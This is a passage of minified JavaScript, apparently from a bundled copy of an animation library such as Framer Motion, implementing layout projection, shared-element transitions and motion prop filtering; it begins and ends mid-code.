i=a.x.translate/e.x,r=a.y.translate/e.y,l=t?.z||0;if((i||r||l)&&(n=`translate3d(${i}px, ${r}px, ${l}px) `),(e.x!==1||e.y!==1)&&(n+=`scale(${1/e.x}, ${1/e.y}) `),t){const{transformPerspective:p,rotate:f,rotateX:h,rotateY:E,skewX:C,skewY:A}=t;p&&(n=`perspective(${p}px) ${n}`),f&&(n+=`rotate(${f}deg) `),h&&(n+=`rotateX(${h}deg) `),E&&(n+=`rotateY(${E}deg) `),C&&(n+=`skewX(${C}deg) `),A&&(n+=`skewY(${A}deg) `)}const u=a.x.scale*e.x,d=a.y.scale*e.y;return(u!==1||d!==1)&&(n+=`scale(${u}, ${d})`),n||"none"}const Y_=["TopLeft","TopRight","BottomLeft","BottomRight"],zne=Y_.length,vR=a=>typeof a=="string"?parseFloat(a):a,yR=a=>typeof a=="number"||Ne.test(a);function Bne(a,e,t,n,i,r){i?(a.opacity=Ja(0,t.opacity??1,Fne(n)),a.opacityExit=Ja(e.opacity??1,0,Vne(n))):r&&(a.opacity=Ja(e.opacity??1,t.opacity??1,n));for(let l=0;l<zne;l++){const u=`border${Y_[l]}Radius`;let d=ER(e,u),p=ER(t,u);if(d===void 0&&p===void 0)continue;d||(d=0),p||(p=0),d===0||p===0||yR(d)===yR(p)?(a[u]=Math.max(Ja(vR(d),vR(p),n),0),(ro.test(p)||ro.test(d))&&(a[u]+="%")):a[u]=p}(e.rotate||t.rotate)&&(a.rotate=Ja(e.rotate||0,t.rotate||0,n))}function ER(a,e){return a[e]!==void 0?a[e]:a.borderRadius}const Fne=$_(0,.5,ON),Vne=$_(.5,.95,gn);function $_(a,e,t){return n=>n<a?0:n>e?1:t(Uc(a,e,n))}function Hne(a,e,t){const n=wt(a)?a:yi(a);return n.start(ES("",n,e,t)),n.animation}function gp(a,e,t,n={passive:!0}){return a.addEventListener(e,t,n),()=>a.removeEventListener(e,t)}const Gne=(a,e)=>a.depth-e.depth;class Qne{constructor(){this.children=[],this.isDirty=!1}add(e){oS(this.children,e),this.isDirty=!0}remove(e){qh(this.children,e),this.isDirty=!0}forEach(e){this.isDirty&&this.children.sort(Gne),this.isDirty=!1,this.children.forEach(e)}}function Jne(a,e){const t=Zt.now(),n=({timestamp:i})=>{const r=i-t;r>=e&&(ei(n),a(r-e))};return va.setup(n,!0),()=>ei(n)}function nh(a){return wt(a)?a.get():a}class Wne{constructor(){this.members=[]}add(e){oS(this.members,e);for(let t=this.members.length-1;t>=0;t--){const n=this.members[t];if(n===e||n===this.lead||n===this.prevLead)continue;const i=n.instance;i&&i.isConnected===!1&&n.isPresent!==!1&&!n.snapshot&&qh(this.members,n)}e.scheduleRender()}remove(e){if(qh(this.members,e),e===this.prevLead&&(this.prevLead=void 0),e===this.lead){const t=this.members[this.members.length-1];t&&this.promote(t)}}relegate(e){const t=this.members.findIndex(i=>e===i);if(t===0)return!1;let n;for(let i=t;i>=0;i--){const r=this.members[i],l=r.instance;if(r.isPresent!==!1&&(!l||l.isConnected!==!1)){n=r;break}}return n?(this.promote(n),!0):!1}promote(e,t){const n=this.lead;if(e!==n&&(this.prevLead=n,this.lead=e,e.show(),n)){n.instance&&n.scheduleRender(),e.scheduleRender();const i=n.options.layoutDependency,r=e.options.layoutDependency;if(!(i!==void 0&&r!==void 0&&i===r)){const d=n.instance;d&&d.isConnected===!1&&!n.snapshot||(e.resumeFrom=n,t&&(e.resumeFrom.preserveOpacity=!0),n.snapshot&&(e.snapshot=n.snapshot,e.snapshot.latestValues=n.animationValues||n.latestValues),e.root&&e.root.isUpdating&&(e.isLayoutDirty=!0))}const{crossfade:u}=e.options;u===!1&&n.hide()}}exitAnimationComplete(){this.members.forEach(e=>{const{options:t,resumingFrom:n}=e;t.onExitComplete&&t.onExitComplete(),n&&n.options.onExitComplete&&n.options.onExitComplete()})}scheduleRender(){this.members.forEach(e=>{e.instance&&e.scheduleRender(!1)})}removeLeadSnapshot(){this.lead&&this.lead.snapshot&&(this.lead.snapshot=void 0)}}const ih={hasAnimatedSinceResize:!0,hasEverUpdated:!1},wy=["","X","Y","Z"],Kne=1e3;let Yne=0;function jy(a,e,t,n){const{latestValues:i}=e;i[a]&&(t[a]=i[a],e.setStaticValue(a,0),n&&(n[a]=0))}function X_(a){if(a.hasCheckedOptimisedAppear=!0,a.root===a)return;const{visualElement:e}=a.options;if(!e)return;const t=g_(e);if(window.MotionHasOptimisedAnimation(t,"transform")){const{layout:i,layoutId:r}=a.options;window.MotionCancelOptimisedAnimation(t,"transform",va,!(i||r))}const{parent:n}=a;n&&!n.hasCheckedOptimisedAppear&&X_(n)}function Z_({attachResizeListener:a,defaultParent:e,measureScroll:t,checkIsScrollRoot:n,resetTransform:i}){return class{constructor(l={},u=e?.()){this.id=Yne++,this.animationId=0,this.animationCommitId=0,this.children=new Set,this.options={},this.isTreeAnimating=!1,this.isAnimationBlocked=!1,this.isLayoutDirty=!1,this.isProjectionDirty=!1,this.isSharedProjectionDirty=!1,this.isTransformDirty=!1,this.updateManuallyBlocked=!1,this.updateBlockedByResize=!1,this.isUpdating=!1,this.isSVG=!1,this.needsReset=!1,this.shouldResetTransform=!1,this.hasCheckedOptimisedAppear=!1,this.treeScale={x:1,y:1},this.eventHandlers=new Map,this.hasTreeAnimated=!1,this.layoutVersion=0,this.updateScheduled=!1,this.scheduleUpdate=()=>this.update(),this.projectionUpdateScheduled=!1,this.checkUpdateFailed=()=>{this.isUpdating&&(this.isUpdating=!1,this.clearAllSnapshots())},this.updateProjection=()=>{this.projectionUpdateScheduled=!1,this.nodes.forEach(Zne),this.nodes.forEach(nie),this.nodes.forEach(iie),this.nodes.forEach(eie)},this.resolvedRelativeTargetAt=0,this.linkedParentVersion=0,this.hasProjected=!1,this.isVisible=!0,this.animationProgress=0,this.sharedNodes=new Map,this.latestValues=l,this.root=u?u.root||u:this,this.path=u?[...u.path,u]:[],this.parent=u,this.depth=u?u.depth+1:0;for(let d=0;d<this.path.length;d++)this.path[d].shouldResetTransform=!0;this.root===this&&(this.nodes=new Qne)}addEventListener(l,u){return this.eventHandlers.has(l)||this.eventHandlers.set(l,new sS),this.eventHandlers.get(l).add(u)}notifyListeners(l,...u){const d=this.eventHandlers.get(l);d&&d.notify(...u)}hasListeners(l){return this.eventHandlers.has(l)}mount(l){if(this.instance)return;this.isSVG=PS(l)&&!Yte(l),this.instance=l;const{layoutId:u,layout:d,visualElement:p}=this.options;if(p&&!p.current&&p.mount(l),this.root.nodes.add(this),this.parent&&this.parent.children.add(this),this.root.hasTreeAnimated&&(d||u)&&(this.isLayoutDirty=!0),a){let f,h=0;const E=()=>this.root.updateBlockedByResize=!1;va.read(()=>{h=window.innerWidth}),a(l,()=>{const C=window.innerWidth;C!==h&&(h=C,this.root.updateBlockedByResize=!0,f&&f(),f=Jne(E,250),ih.hasAnimatedSinceResize&&(ih.hasAnimatedSinceResize=!1,this.nodes.forEach(TR)))})}u&&this.root.registerSharedNode(u,this),this.options.animate!==!1&&p&&(u||d)&&this.addEventListener("didUpdate",({delta:f,hasLayoutChanged:h,hasRelativeLayoutChanged:E,layout:C})=>{if(this.isTreeAnimationBlocked()){this.target=void 0,this.relativeTarget=void 0;return}const A=this.options.transition||p.getDefaultTransition()||cie,{onLayoutAnimationStart:j,onLayoutAnimationComplete:R}=p.getProps(),I=!this.targetLayout||!K_(this.targetLayout,C),w=!h&&E;if(this.options.layoutRoot||this.resumeFrom||w||h&&(I||!this.currentAnimation)){this.resumeFrom&&(this.resumingFrom=this.resumeFrom,this.resumingFrom.resumingFrom=void 0);const k={...yS(A,"layout"),onPlay:j,onComplete:R};(p.shouldReduceMotion||this.options.layoutRoot)&&(k.delay=0,k.type=!1),this.startAnimation(k),this.setAnimationOrigin(f,w)}else h||TR(this),this.isLead()&&this.options.onExitComplete&&this.options.onExitComplete();this.targetLayout=C})}unmount(){this.options.layoutId&&this.willUpdate(),this.root.nodes.remove(this);const l=this.getStack();l&&l.remove(this),this.parent&&this.parent.children.delete(this),this.instance=void 0,this.eventHandlers.clear(),ei(this.updateProjection)}blockUpdate(){this.updateManuallyBlocked=!0}unblockUpdate(){this.updateManuallyBlocked=!1}isUpdateBlocked(){return this.updateManuallyBlocked||this.updateBlockedByResize}isTreeAnimationBlocked(){return this.isAnimationBlocked||this.parent&&this.parent.isTreeAnimationBlocked()||!1}startUpdate(){this.isUpdateBlocked()||(this.isUpdating=!0,this.nodes&&this.nodes.forEach(oie),this.animationId++)}getTransformTemplate(){const{visualElement:l}=this.options;return l&&l.getProps().transformTemplate}willUpdate(l=!0){if(this.root.hasTreeAnimated=!0,this.root.isUpdateBlocked()){this.options.onExitComplete&&this.options.onExitComplete();return}if(window.MotionCancelOptimisedAnimation&&!this.hasCheckedOptimisedAppear&&X_(this),!this.root.isUpdating&&this.root.startUpdate(),this.isLayoutDirty)return;this.isLayoutDirty=!0;for(let f=0;f<this.path.length;f++){const h=this.path[f];h.shouldResetTransform=!0,h.updateScroll("snapshot"),h.options.layoutRoot&&h.willUpdate(!1)}const{layoutId:u,layout:d}=this.options;if(u===void 0&&!d)return;const p=this.getTransformTemplate();this.prevTransformTemplateValue=p?p(this.latestValues,""):void 0,this.updateSnapshot(),l&&this.notifyListeners("willUpdate")}update(){if(this.updateScheduled=!1,this.isUpdateBlocked()){this.unblockUpdate(),this.clearAllSnapshots(),this.nodes.forEach(SR);return}if(this.animationId<=this.animationCommitId){this.nodes.forEach(CR);return}this.animationCommitId=this.animationId,this.isUpdating?(this.isUpdating=!1,this.nodes.forEach(tie),this.nodes.forEach($ne),this.nodes.forEach(Xne)):this.nodes.forEach(CR),this.clearAllSnapshots();const u=Zt.now();Lt.delta=Pi(0,1e3/60,u-Lt.timestamp),Lt.timestamp=u,Lt.isProcessing=!0,Cy.update.process(Lt),Cy.preRender.process(Lt),Cy.render.process(Lt),Lt.isProcessing=!1}didUpdate(){this.updateScheduled||(this.updateScheduled=!0,xS.read(this.scheduleUpdate))}clearAllSnapshots(){this.nodes.forEach(aie),this.sharedNodes.forEach(sie)}scheduleUpdateProjection(){this.projectionUpdateScheduled||(this.projectionUpdateScheduled=!0,va.preRender(this.updateProjection,!1,!0))}scheduleCheckAfterUnmount(){va.postRender(()=>{this.isLayoutDirty?this.root.didUpdate():this.root.checkUpdateFailed()})}updateSnapshot(){this.snapshot||!this.instance||(this.snapshot=this.measure(),this.snapshot&&!en(this.snapshot.measuredBox.x)&&!en(this.snapshot.measuredBox.y)&&(this.snapshot=void 0))}updateLayout(){if(!this.instance||(this.updateScroll(),!(this.options.alwaysMeasureLayout&&this.isLead())&&!this.isLayoutDirty))return;if(this.resumeFrom&&!this.resumeFrom.instance)for(let d=0;d<this.path.length;d++)this.path[d].updateScroll();const l=this.layout;this.layout=this.measure(!1),this.layoutVersion++,this.layoutCorrected=bt(),this.isLayoutDirty=!1,this.projectionDelta=void 0,this.notifyListeners("measure",this.layout.layoutBox);const{visualElement:u}=this.options;u&&u.notify("LayoutMeasure",this.layout.layoutBox,l?l.layoutBox:void 0)}updateScroll(l="measure"){let u=!!(this.options.layoutScroll&&this.instance);if(this.scroll&&this.scroll.animationId===this.root.animationId&&this.scroll.phase===l&&(u=!1),u&&this.instance){const d=n(this.instance);this.scroll={animationId:this.root.animationId,phase:l,isRoot:d,offset:t(this.instance),wasRoot:this.scroll?this.scroll.isRoot:d}}}resetTransform(){if(!i)return;const l=this.isLayoutDirty||this.shouldResetTransform||this.options.alwaysMeasureLayout,u=this.projectionDelta&&!W_(this.projectionDelta),d=this.getTransformTemplate(),p=d?d(this.latestValues,""):void 0,f=p!==this.prevTransformTemplateValue;l&&this.instance&&(u||Gr(this.latestValues)||f)&&(i(this.instance,p),this.shouldResetTransform=!1,this.scheduleRender())}measure(l=!0){const u=this.measurePageBox();let d=this.removeElementScroll(u);return l&&(d=this.removeTransform(d)),uie(d),{animationId:this.root.animationId,measuredBox:u,layoutBox:d,latestValues:{},source:this.id}}measurePageBox(){const{visualElement:l}=this.options;if(!l)return bt();const u=l.measureViewportBox();if(!(this.scroll?.wasRoot||this.path.some(die))){const{scroll:p}=this.root;p&&(yc(u.x,p.offset.x),yc(u.y,p.offset.y))}return u}removeElementScroll(l){const u=bt();if(hi(u,l),this.scroll?.wasRoot)return u;for(let d=0;d<this.path.length;d++){const p=this.path[d],{scroll:f,options:h}=p;p!==this.root&&f&&h.layoutScroll&&(f.wasRoot&&hi(u,l),yc(u.x,f.offset.x),yc(u.y,f.offset.y))}return u}applyTransform(l,u=!1){const d=bt();hi(d,l);for(let p=0;p<this.path.length;p++){const f=this.path[p];!u&&f.options.layoutScroll&&f.scroll&&f!==f.root&&Ec(d,{x:-f.scroll.offset.x,y:-f.scroll.offset.y}),Gr(f.latestValues)&&Ec(d,f.latestValues)}return Gr(this.latestValues)&&Ec(d,this.latestValues),d}removeTransform(l){const u=bt();hi(u,l);for(let d=0;d<this.path.length;d++){const p=this.path[d];if(!p.instance||!Gr(p.latestValues))continue;sE(p.latestValues)&&p.updateSnapshot();const f=bt(),h=p.measurePageBox();hi(f,h),pR(u,p.latestValues,p.snapshot?p.snapshot.layoutBox:void 0,f)}return Gr(this.latestValues)&&pR(u,this.latestValues),u}setTargetDelta(l){this.targetDelta=l,this.root.scheduleUpdateProjection(),this.isProjectionDirty=!0}setOptions(l){this.options={...this.options,...l,crossfade:l.crossfade!==void 0?l.crossfade:!0}}clearMeasurements(){this.scroll=void 0,this.layout=void 0,this.snapshot=void 0,this.prevTransformTemplateValue=void 0,this.targetDelta=void 0,this.target=void 0,this.isLayoutDirty=!1}forceRelativeParentToResolveTarget(){this.relativeParent&&this.relativeParent.resolvedRelativeTargetAt!==Lt.timestamp&&this.relativeParent.resolveTargetDelta(!0)}resolveTargetDelta(l=!1){const u=this.getLead();this.isProjectionDirty||(this.isProjectionDirty=u.isProjectionDirty),this.isTransformDirty||(this.isTransformDirty=u.isTransformDirty),this.isSharedProjectionDirty||(this.isSharedProjectionDirty=u.isSharedProjectionDirty);const d=!!this.resumingFrom||this!==u;if(!(l||d&&this.isSharedProjectionDirty||this.isProjectionDirty||this.parent?.isProjectionDirty||this.attemptToResolveRelativeTarget||this.root.updateBlockedByResize))return;const{layout:f,layoutId:h}=this.options;if(!this.layout||!(f||h))return;this.resolvedRelativeTargetAt=Lt.timestamp;const E=this.getClosestProjectingParent();E&&this.linkedParentVersion!==E.layoutVersion&&!E.options.layoutRoot&&this.removeRelativeTarget(),!this.targetDelta&&!this.relativeTarget&&(E&&E.layout?this.createRelativeTarget(E,this.layout.layoutBox,E.layout.layoutBox):this.removeRelativeTarget()),!(!this.relativeTarget&&!this.targetDelta)&&(this.target||(this.target=bt(),this.targetWithTransforms=bt()),this.relativeTarget&&this.relativeTargetOrigin&&this.relativeParent&&this.relativeParent.target?(this.forceRelativeParentToResolveTarget(),Nne(this.target,this.relativeTarget,this.relativeParent.target)):this.targetDelta?(this.resumingFrom?this.target=this.applyTransform(this.layout.layoutBox):hi(this.target,this.layout.layoutBox),q_(this.target,this.targetDelta)):hi(this.target,this.layout.layoutBox),this.attemptToResolveRelativeTarget&&(this.attemptToResolveRelativeTarget=!1,E&&!!E.resumingFrom==!!this.resumingFrom&&!E.options.layoutScroll&&E.target&&this.animationProgress!==1?this.createRelativeTarget(E,this.target,E.target):this.relativeParent=this.relativeTarget=void 0))}getClosestProjectingParent(){if(!(!this.parent||sE(this.parent.latestValues)||__(this.parent.latestValues)))return this.parent.isProjecting()?this.parent:this.parent.getClosestProjectingParent()}isProjecting(){return!!((this.relativeTarget||this.targetDelta||this.options.layoutRoot)&&this.layout)}createRelativeTarget(l,u,d){this.relativeParent=l,this.linkedParentVersion=l.layoutVersion,this.forceRelativeParentToResolveTarget(),this.relativeTarget=bt(),this.relativeTargetOrigin=bt(),Fh(this.relativeTargetOrigin,u,d),hi(this.relativeTarget,this.relativeTargetOrigin)}removeRelativeTarget(){this.relativeParent=this.relativeTarget=void 0}calcProjection(){const l=this.getLead(),u=!!this.resumingFrom||this!==l;let d=!0;if((this.isProjectionDirty||this.parent?.isProjectionDirty)&&(d=!1),u&&(this.isSharedProjectionDirty||this.isTransformDirty)&&(d=!1),this.resolvedRelativeTargetAt===Lt.timestamp&&(d=!1),d)return;const{layout:p,layoutId:f}=this.options;if(this.isTreeAnimating=!!(this.parent&&this.parent.isTreeAnimating||this.currentAnimation||this.pendingAnimation),this.isTreeAnimating||(this.targetDelta=this.relativeTarget=void 0),!this.layout||!(p||f))return;hi(this.layoutCorrected,this.layout.layoutBox);const h=this.treeScale.x,E=this.treeScale.y;cne(this.layoutCorrected,this.treeScale,this.path,u),l.layout&&!l.target&&(this.treeScale.x!==1||this.treeScale.y!==1)&&(l.target=l.layout.layoutBox,l.targetWithTransforms=bt());const{target:C}=l;if(!C){this.prevProjectionDelta&&(this.createProjectionDeltas(),this.scheduleRender());return}!this.projectionDelta||!this.prevProjectionDelta?this.createProjectionDeltas():(sR(this.prevProjectionDelta.x,this.projectionDelta.x),sR(this.prevProjectionDelta.y,this.projectionDelta.y)),Jd(this.projectionDelta,this.layoutCorrected,C,this.latestValues),(this.treeScale.x!==h||this.treeScale.y!==E||!bR(this.projectionDelta.x,this.prevProjectionDelta.x)||!bR(this.projectionDelta.y,this.prevProjectionDelta.y))&&(this.hasProjected=!0,this.scheduleRender(),this.notifyListeners("projectionUpdate",C))}hide(){this.isVisible=!1}show(){this.isVisible=!0}scheduleRender(l=!0){if(this.options.visualElement?.scheduleRender(),l){const u=this.getStack();u&&u.scheduleRender()}this.resumingFrom&&!this.resumingFrom.instance&&(this.resumingFrom=void 0)}createProjectionDeltas(){this.prevProjectionDelta=vc(),this.projectionDelta=vc(),this.projectionDeltaWithTransform=vc()}setAnimationOrigin(l,u=!1){const d=this.snapshot,p=d?d.latestValues:{},f={...this.latestValues},h=vc();(!this.relativeParent||!this.relativeParent.options.layoutRoot)&&(this.relativeTarget=this.relativeTargetOrigin=void 0),this.attemptToResolveRelativeTarget=!u;const E=bt(),C=d?d.source:void 0,A=this.layout?this.layout.source:void 0,j=C!==A,R=this.getStack(),I=!R||R.members.length<=1,w=!!(j&&!I&&this.options.crossfade===!0&&!this.path.some(lie));this.animationProgress=0;let k;this.mixTargetDelta=Y=>{const ee=Y/1e3;xR(h.x,l.x,ee),xR(h.y,l.y,ee),this.setTargetDelta(h),this.relativeTarget&&this.relativeTargetOrigin&&this.layout&&this.relativeParent&&this.relativeParent.layout&&(Fh(E,this.layout.layoutBox,this.relativeParent.layout.layoutBox),rie(this.relativeTarget,this.relativeTargetOrigin,E,ee),k&&One(this.relativeTarget,k)&&(this.isProjectionDirty=!1),k||(k=bt()),hi(k,this.relativeTarget)),j&&(this.animationValues=f,Bne(f,p,this.latestValues,ee,w,I)),this.root.scheduleUpdateProjection(),this.scheduleRender(),this.animationProgress=ee},this.mixTargetDelta(this.options.layoutRoot?1e3:0)}startAnimation(l){this.notifyListeners("animationStart"),this.currentAnimation?.stop(),this.resumingFrom?.currentAnimation?.stop(),this.pendingAnimation&&(ei(this.pendingAnimation),this.pendingAnimation=void 0),this.pendingAnimation=va.update(()=>{ih.hasAnimatedSinceResize=!0,this.motionValue||(this.motionValue=yi(0)),this.motionValue.jump(0,!1),this.currentAnimation=Hne(this.motionValue,[0,1e3],{...l,velocity:0,isSync:!0,onUpdate:u=>{this.mixTargetDelta(u),l.onUpdate&&l.onUpdate(u)},onStop:()=>{},onComplete:()=>{l.onComplete&&l.onComplete(),this.completeAnimation()}}),this.resumingFrom&&(this.resumingFrom.currentAnimation=this.currentAnimation),this.pendingAnimation=void 0})}completeAnimation(){this.resumingFrom&&(this.resumingFrom.currentAnimation=void 0,this.resumingFrom.preserveOpacity=void 0);const l=this.getStack();l&&l.exitAnimationComplete(),this.resumingFrom=this.currentAnimation=this.animationValues=void 0,this.notifyListeners("animationComplete")}finishAnimation(){this.currentAnimation&&(this.mixTargetDelta&&this.mixTargetDelta(Kne),this.currentAnimation.stop()),this.completeAnimation()}applyTransformsToTarget(){const l=this.getLead();let{targetWithTransforms:u,target:d,layout:p,latestValues:f}=l;if(!(!u||!d||!p)){if(this!==l&&this.layout&&p&&eq(this.options.animationType,this.layout.layoutBox,p.layoutBox)){d=this.target||bt();const h=en(this.layout.layoutBox.x);d.x.min=l.target.x.min,d.x.max=d.x.min+h;const E=en(this.layout.layoutBox.y);d.y.min=l.target.y.min,d.y.max=d.y.min+E}hi(u,d),Ec(u,f),Jd(this.projectionDeltaWithTransform,this.layoutCorrected,u,f)}}registerSharedNode(l,u){this.sharedNodes.has(l)||this.sharedNodes.set(l,new Wne),this.sharedNodes.get(l).add(u);const p=u.options.initialPromotionConfig;u.promote({transition:p?p.transition:void 0,preserveFollowOpacity:p&&p.shouldPreserveFollowOpacity?p.shouldPreserveFollowOpacity(u):void 0})}isLead(){const l=this.getStack();return l?l.lead===this:!0}getLead(){const{layoutId:l}=this.options;return l?this.getStack()?.lead||this:this}getPrevLead(){const{layoutId:l}=this.options;return l?this.getStack()?.prevLead:void 0}getStack(){const{layoutId:l}=this.options;if(l)return this.root.sharedNodes.get(l)}promote({needsReset:l,transition:u,preserveFollowOpacity:d}={}){const p=this.getStack();p&&p.promote(this,d),l&&(this.projectionDelta=void 0,this.needsReset=!0),u&&this.setOptions({transition:u})}relegate(){const l=this.getStack();return l?l.relegate(this):!1}resetSkewAndRotation(){const{visualElement:l}=this.options;if(!l)return;let u=!1;const{latestValues:d}=l;if((d.z||d.rotate||d.rotateX||d.rotateY||d.rotateZ||d.skewX||d.skewY)&&(u=!0),!u)return;const p={};d.z&&jy("z",l,p,this.animationValues);for(let f=0;f<wy.length;f++)jy(`rotate${wy[f]}`,l,p,this.animationValues),jy(`skew${wy[f]}`,l,p,this.animationValues);l.render();for(const f in p)l.setStaticValue(f,p[f]),this.animationValues&&(this.animationValues[f]=p[f]);l.scheduleRender()}applyProjectionStyles(l,u){if(!this.instance||this.isSVG)return;if(!this.isVisible){l.visibility="hidden";return}const d=this.getTransformTemplate();if(this.needsReset){this.needsReset=!1,l.visibility="",l.opacity="",l.pointerEvents=nh(u?.pointerEvents)||"",l.transform=d?d(this.latestValues,""):"none";return}const p=this.getLead();if(!this.projectionDelta||!this.layout||!p.target){this.options.layoutId&&(l.opacity=this.latestValues.opacity!==void 0?this.latestValues.opacity:1,l.pointerEvents=nh(u?.pointerEvents)||""),this.hasProjected&&!Gr(this.latestValues)&&(l.transform=d?d({},""):"none",this.hasProjected=!1);return}l.visibility="";const f=p.animationValues||p.latestValues;this.applyTransformsToTarget();let h=Une(this.projectionDeltaWithTransform,this.treeScale,f);d&&(h=d(f,h)),l.transform=h;const{x:E,y:C}=this.projectionDelta;l.transformOrigin=`${E.origin*100}% ${C.origin*100}% 0`,p.animationValues?l.opacity=p===this?f.opacity??this.latestValues.opacity??1:this.preserveOpacity?this.latestValues.opacity:f.opacityExit:l.opacity=p===this?f.opacity!==void 0?f.opacity:"":f.opacityExit!==void 0?f.opacityExit:0;for(const A in lE){if(f[A]===void 0)continue;const{correct:j,applyTo:R,isCSSVariable:I}=lE[A],w=h==="none"?f[A]:j(f[A],p);if(R){const k=R.length;for(let Y=0;Y<k;Y++)l[R[Y]]=w}else I?this.options.visualElement.renderState.vars[A]=w:l[A]=w}this.options.layoutId&&(l.pointerEvents=p===this?nh(u?.pointerEvents)||"":"none")}clearSnapshot(){this.resumeFrom=this.snapshot=void 0}resetTree(){this.root.nodes.forEach(l=>l.currentAnimation?.stop()),this.root.nodes.forEach(SR),this.root.sharedNodes.clear()}}}function $ne(a){a.updateLayout()}function Xne(a){const e=a.resumeFrom?.snapshot||a.snapshot;if(a.isLead()&&a.layout&&e&&a.hasListeners("didUpdate")){const{layoutBox:t,measuredBox:n}=a.layout,{animationType:i}=a.options,r=e.source!==a.layout.source;i==="size"?Zi(f=>{const h=r?e.measuredBox[f]:e.layoutBox[f],E=en(h);h.min=t[f].min,h.max=h.min+E}):eq(i,e.layoutBox,t)&&Zi(f=>{const h=r?e.measuredBox[f]:e.layoutBox[f],E=en(t[f]);h.max=h.min+E,a.relativeTarget&&!a.currentAnimation&&(a.isProjectionDirty=!0,a.relativeTarget[f].max=a.relativeTarget[f].min+E)});const l=vc();Jd(l,t,e.layoutBox);const u=vc();r?Jd(u,a.applyTransform(n,!0),e.measuredBox):Jd(u,t,e.layoutBox);const d=!W_(l);let p=!1;if(!a.resumeFrom){const f=a.getClosestProjectingParent();if(f&&!f.resumeFrom){const{snapshot:h,layout:E}=f;if(h&&E){const C=bt();Fh(C,e.layoutBox,h.layoutBox);const A=bt();Fh(A,t,E.layoutBox),K_(C,A)||(p=!0),f.options.layoutRoot&&(a.relativeTarget=A,a.relativeTargetOrigin=C,a.relativeParent=f)}}}a.notifyListeners("didUpdate",{layout:t,snapshot:e,delta:u,layoutDelta:l,hasLayoutChanged:d,hasRelativeLayoutChanged:p})}else if(a.isLead()){const{onExitComplete:t}=a.options;t&&t()}a.options.transition=void 0}function Zne(a){a.parent&&(a.isProjecting()||(a.isProjectionDirty=a.parent.isProjectionDirty),a.isSharedProjectionDirty||(a.isSharedProjectionDirty=!!(a.isProjectionDirty||a.parent.isProjectionDirty||a.parent.isSharedProjectionDirty)),a.isTransformDirty||(a.isTransformDirty=a.parent.isTransformDirty))}function eie(a){a.isProjectionDirty=a.isSharedProjectionDirty=a.isTransformDirty=!1}function aie(a){a.clearSnapshot()}function SR(a){a.clearMeasurements()}function CR(a){a.isLayoutDirty=!1}function tie(a){const{visualElement:e}=a.options;e&&e.getProps().onBeforeLayoutMeasure&&e.notify("BeforeLayoutMeasure"),a.resetTransform()}function TR(a){a.finishAnimation(),a.targetDelta=a.relativeTarget=a.target=void 0,a.isProjectionDirty=!0}function nie(a){a.resolveTargetDelta()}function iie(a){a.calcProjection()}function oie(a){a.resetSkewAndRotation()}function sie(a){a.removeLeadSnapshot()}function xR(a,e,t){a.translate=Ja(e.translate,0,t),a.scale=Ja(e.scale,1,t),a.origin=e.origin,a.originPoint=e.originPoint}function AR(a,e,t,n){a.min=Ja(e.min,t.min,n),a.max=Ja(e.max,t.max,n)}function rie(a,e,t,n){AR(a.x,e.x,t.x,n),AR(a.y,e.y,t.y,n)}function lie(a){return a.animationValues&&a.animationValues.opacityExit!==void 0}const cie={duration:.45,ease:[.4,0,.1,1]},PR=a=>typeof navigator<"u"&&navigator.userAgent&&navigator.userAgent.toLowerCase().includes(a),LR=PR("applewebkit/")&&!PR("chrome/")?Math.round:gn;function RR(a){a.min=LR(a.min),a.max=LR(a.max)}function uie(a){RR(a.x),RR(a.y)}function eq(a,e,t){return a==="position"||a==="preserve-aspect"&&!Mne(gR(e),gR(t),.2)}function die(a){return a!==a.root&&a.scroll?.wasRoot}const pie=Z_({attachResizeListener:(a,e)=>gp(a,"resize",e),measureScroll:()=>({x:document.documentElement.scrollLeft||document.body?.scrollLeft||0,y:document.documentElement.scrollTop||document.body?.scrollTop||0}),checkIsScrollRoot:()=>!0}),Dy={current:void 0},aq=Z_({measureScroll:a=>({x:a.scrollLeft,y:a.scrollTop}),defaultParent:()=>{if(!Dy.current){const a=new pie({});a.mount(window),a.setOptions({layoutScroll:!0}),Dy.current=a}return Dy.current},resetTransform:(a,e)=>{a.style.transform=e!==void 0?e:"none"},checkIsScrollRoot:a=>window.getComputedStyle(a).position==="fixed"}),Ig=U.createContext({transformPagePoint:a=>a,isStatic:!1,reducedMotion:"never"});function mie(a=!0){const e=U.useContext(iS);if(e===null)return[!0,null];const{isPresent:t,onExitComplete:n,register:i}=e,r=U.useId();U.useEffect(()=>{if(a)return i(r)},[a]);const l=U.useCallback(()=>a&&n&&n(r),[r,n,a]);return!t&&n?[!1,l]:[!0]}const tq=U.createContext({strict:!1}),IR={animation:["animate","variants","whileHover","whileTap","exit","whileInView","whileFocus","whileDrag"],exit:["exit"],drag:["drag","dragControls"],focus:["whileFocus"],hover:["whileHover","onHoverStart","onHoverEnd"],tap:["whileTap","onTap","onTapStart","onTapCancel"],pan:["onPan","onPanStart","onPanSessionStart","onPanEnd"],inView:["whileInView","onViewportEnter","onViewportLeave"],layout:["layout","layoutId"]};let wR=!1;function fie(){if(wR)return;const a={};for(const e in IR)a[e]={isEnabled:t=>IR[e].some(n=>!!t[n])};D_(a),wR=!0}function nq(){return fie(),one()}function hie(a){const e=nq();for(const t in a)e[t]={...e[t],...a[t]};D_(e)}const gie=new Set(["animate","exit","variants","initial","style","values","variants","transition","transformTemplate","custom","inherit","onBeforeLayoutMeasure","onAnimationStart","onAnimationComplete","onUpdate","onDragStart","onDrag","onDragEnd","onMeasureDragConstraints","onDirectionLock","onDragTransitionEnd","_dragX","_dragY","onHoverStart","onHoverEnd","onViewportEnter","onViewportLeave","globalTapTarget","propagate","ignoreStrict","viewport"]);function Vh(a){return a.startsWith("while")||a.startsWith("drag")&&a!=="draggable"||a.startsWith("layout")||a.startsWith("onTap")||a.startsWith("onPan")||a.startsWith("onLayout")||gie.has(a)}let iq=a=>!Vh(a);function bie(a){typeof a=="function"&&(iq=e=>e.startsWith("on")?!Vh(e):a(e))}try{bie(require("@emotion/is-prop-valid").default)}catch{}function vie(a,e,t){const n={};for(const i in a)i==="values"&&typeof a.values=="object"||(iq(i)||t===!0&&Vh(i)||!e&&!Vh(i)||a.draggable&&i.startsWith("onDrag"))&&(n[i]=a[i]);return n}const wg=U.createContext({});function yie(a,e){if(Rg(a)){const{initial:t,animate:n}=a;return{initial:t===!1||hp(t)?t:void 0,animate:hp(n)?n:void 0}}return a.inherit!==!1?e:{}}function Eie(a){const{initial:e,animate:t}=yie(a,U.useContext(wg));return U.useMemo(()=>({initial:e,animate:t}),[jR(e),jR(t)])}function jR(a){return 